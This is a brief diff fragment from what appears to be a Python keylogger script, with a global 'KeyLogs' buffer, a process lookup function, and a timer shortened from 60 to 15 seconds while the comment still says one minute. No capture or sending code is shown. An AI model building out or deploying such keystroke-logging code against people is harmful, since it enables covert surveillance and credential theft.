@@ -13,7 +13,7 @@ current_window = None
 global KeyLogs
 KeyLogs = ""
 start_time = time.time()
-max_time = 60 # 1 minute
+max_time = 15 # 1 minute
 
 
 def get_current_process():
